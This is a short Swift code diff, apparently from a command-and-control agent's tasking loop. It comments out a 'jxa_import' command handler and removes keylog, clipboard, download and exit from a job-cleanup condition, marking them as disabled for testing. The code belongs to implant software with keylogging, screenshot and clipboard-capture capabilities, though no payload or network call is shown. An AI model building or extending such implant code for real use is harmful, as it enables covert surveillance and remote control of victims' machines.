@@ -135,6 +135,8 @@ func getTasking(jobList: JobList) throws {
                 job.uploadFullPath = path
             }
         }
+        // DISABLED FOR TESTING - jxa_import is a disabled command
+        /*
         else if job.command == "jxa_import" {
             // Clear any old JXA scripts
             jxaScript = ""
@@ -144,6 +146,7 @@ func getTasking(jobList: JobList) throws {
                 job.uploadFileID = json["file"].stringValue
             }
         }
+        */
         
         // Add jobs to the job list and increase jobCount by 1
         jobList.jobs.append(job)
@@ -521,7 +524,8 @@ func postResponse(jobList: JobList) {
                 // Found a job that succeeded and matched with task_id
                 if responses["task_id"].stringValue == job.taskID {
                     // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit") && (job.command != "jxa_import")) {
+                    // DISABLED commands (download, clipboard, keylog, exit, jxa_import) removed from condition
+                    if ((job.command != "upload") && (job.command != "screenshot")) {
                         jobList.jobs.remove(at: index)
                         print("job removed")
                     }
